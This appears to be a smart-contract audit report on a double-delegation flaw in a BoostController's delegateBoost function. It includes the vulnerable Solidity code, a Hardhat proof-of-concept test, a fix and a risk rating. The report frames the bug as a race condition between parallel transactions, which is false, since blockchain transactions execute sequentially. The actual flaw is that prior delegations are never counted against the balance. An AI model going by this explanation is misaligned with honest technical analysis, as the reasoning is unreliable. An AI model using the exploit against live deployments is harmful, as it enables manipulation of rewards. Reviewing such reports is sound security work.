# Double-Delegation Race Condition in BoostController Enables Boost Exploitation


## Summary
A critical race condition vulnerability exists in the `BoostController.sol` boost delegation mechanism, allowing users to perform multiple boost delegations simultaneously before balance checks can prevent double-spending of their voting power.

## Vulnerability Details
The `delegateBoost` function performs balance verification and delegation state updates in separate stages:

```solidity
function delegateBoost(
    address to,
    uint256 amount,
    uint256 duration
) external override nonReentrant {
    // @audit Basic validation checks
    if (paused()) revert EmergencyPaused();
    if (to == address(0)) revert InvalidPool();
    if (amount == 0) revert InvalidBoostAmount();
    if (duration < MIN_DELEGATION_DURATION || duration > MAX_DELEGATION_DURATION) 
        revert InvalidDelegationDuration();
    
    // @audit-issue CRITICAL: Balance check happens here but state isn't updated atomically
    // This enables race condition as parallel txs will see the same balance
    uint256 userBalance = IERC20(address(veToken)).balanceOf(msg.sender);
    if (userBalance < amount) revert InsufficientVeBalance();
    
    // @audit-issue CRITICAL: Delegation state update happens separately from balance check
    // Allows multiple delegations to pass balance check before any state is updated
    UserBoost storage delegation = userBoosts[msg.sender][to];
    if (delegation.amount > 0) revert BoostAlreadyDelegated();
    
    // @audit-issue State updates happen after all checks
    // By this point, parallel transactions could have already passed validation
    delegation.amount = amount;              // Sets delegation amount
    delegation.expiry = block.timestamp + duration;  // Sets expiry
    delegation.delegatedTo = to;             // Sets recipient
    delegation.lastUpdateTime = block.timestamp;    // Updates timestamp
    
    emit BoostDelegated(msg.sender, to, amount, duration);
}
```

Critical issues:

* Balance checks happen in separate transactions
* No mechanism locks the total user balance
* Concurrent transactions can use the same balance before state updates
* The `nonReentrant` modifier does not prevent parallel transactions

## Impact
* Users can delegate more boost than their actual `veToken` balance
* Boost calculations become inaccurate across all delegations
* Reward distribution system becomes unbalanced
* Economic exploitation possible through inflated voting power

## Proof of Concept
This POC demonstrates how an attacker can exploit the race condition in the boost delegation system by executing parallel transactions. Here's what the attack does:

### Setup Phase:
* We deploy a mock `veToken` contract and the `BoostController`
* Mint 100 `veTokens` to the attacker's address
* Set up two recipient addresses for the double-delegation

### Attack Execution:
* The attacker creates two identical delegation transactions
* Each transaction attempts to delegate the full balance (100 tokens)
* Transactions are submitted in parallel within the same block
* Both pass the balance check since they see the original balance

### Verification:
* We verify both delegations succeeded
* Show that total delegated amount (200) exceeds actual balance (100)
* Prove the race condition allowed double-spending of boost power

### Expected Results:
* Both delegations will be recorded as valid
* Total delegated amount will be 2x the actual balance
* Protocol's boost calculations are compromised

The complete POC code:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { mine, time } = require("@nomicfoundation/hardhat-network-helpers");

describe("BoostController Double-Delegation Attack", function() {
    let boostController, veToken;
    let deployer, attacker, recipient1, recipient2;
    const INITIAL_BALANCE = ethers.utils.parseEther("100");
    const WEEK = 7 * 24 * 60 * 60;

    before(async function() {
        [deployer, attacker, recipient1, recipient2] = await ethers.getSigners();

        const VeToken = await ethers.getContractFactory("MockVeToken");
        veToken = await VeToken.deploy("Vote Escrowed Token", "veToken");
        await veToken.deployed();

        const BoostController = await ethers.getContractFactory("BoostController");
        boostController = await BoostController.deploy(veToken.address);
        await boostController.deployed();

        await veToken.connect(deployer).mint(attacker.address, INITIAL_BALANCE);
    });

    it("Should demonstrate double-delegation exploit", async function() {
        console.log("\nStarting Double-Delegation Attack Demo");
        console.log("--------------------------------------");
        
        console.log(`Attacker veToken Balance: ${ethers.utils.formatEther(INITIAL_BALANCE)}`);
        
        const delegationAmount = INITIAL_BALANCE;
        const duration = WEEK;

        const tx1 = boostController.connect(attacker).delegateBoost(
            recipient1.address,
            delegationAmount,
            duration
        );

        const tx2 = boostController.connect(attacker).delegateBoost(
            recipient2.address,
            delegationAmount,
            duration
        );

        console.log("\nExecuting parallel delegations...");
        await Promise.all([tx1, tx2]);

        const delegation1 = await boostController.getUserBoost(attacker.address, recipient1.address);
        const delegation2 = await boostController.getUserBoost(attacker.address, recipient2.address);

        expect(delegation1.amount).to.equal(INITIAL_BALANCE);
        expect(delegation2.amount).to.equal(INITIAL_BALANCE);
        const totalDelegated = delegation1.amount.add(delegation2.amount);
        expect(totalDelegated).to.be.gt(INITIAL_BALANCE);

        console.log("\nExploit successful! Double-delegation achieved.");
    });
});
```

## Tools Used
* Manual code review
* Hardhat for testing
* Contract verification tools

## Recommendation
```solidity
contract BoostController {
    // @audit-info Add tracking for total delegated amounts
    mapping(address => uint256) public totalDelegated;

    function delegateBoost(
        address to,
        uint256 amount,
        uint256 duration
    ) external override nonReentrant {
        if (paused()) revert EmergencyPaused();
        if (to == address(0)) revert InvalidPool();
        if (amount == 0) revert InvalidBoostAmount();
        if (duration < MIN_DELEGATION_DURATION || duration > MAX_DELEGATION_DURATION) 
            revert InvalidDelegationDuration();

        // @audit-ok Get current balance and calculate new total delegated
        uint256 userBalance = IERC20(address(veToken)).balanceOf(msg.sender);
        uint256 newTotalDelegated = totalDelegated[msg.sender] + amount;
        
        // @audit-ok Check total delegated against full balance
        if (newTotalDelegated > userBalance) revert InsufficientVeBalance();
        
        UserBoost storage delegation = userBoosts[msg.sender][to];
        if (delegation.amount > 0) revert BoostAlreadyDelegated();
        
        // @audit-ok Update total delegated first
        totalDelegated[msg.sender] = newTotalDelegated;
        
        // Then update delegation details
        delegation.amount = amount;
        delegation.expiry = block.timestamp + duration;
        delegation.delegatedTo = to;
        delegation.lastUpdateTime = block.timestamp;
        
        emit BoostDelegated(msg.sender, to, amount, duration);
    }

    // @audit-ok Add function to remove delegation
    function removeDelegation(address from) external {
        UserBoost storage delegation = userBoosts[msg.sender][from];
        if (delegation.amount == 0) revert NoDelegationExists();
        
        // Update total delegated first
        totalDelegated[msg.sender] -= delegation.amount;
        
        // Then clear delegation
        delete userBoosts[msg.sender][from];
        
        emit DelegationRemoved(msg.sender, from, delegation.amount);
    }
}
```

## Risk Breakdown
* **Severity**: HIGH
  * Enables boost power manipulation
  * Affects core reward mechanism

* **Likelihood**: HIGH
  * Easy to execute
  * No special tools needed
  * Clear economic incentive

* **Impact**: CRITICAL
  * Reward system manipulation
  * Economic exploitation
  * Unfair advantage
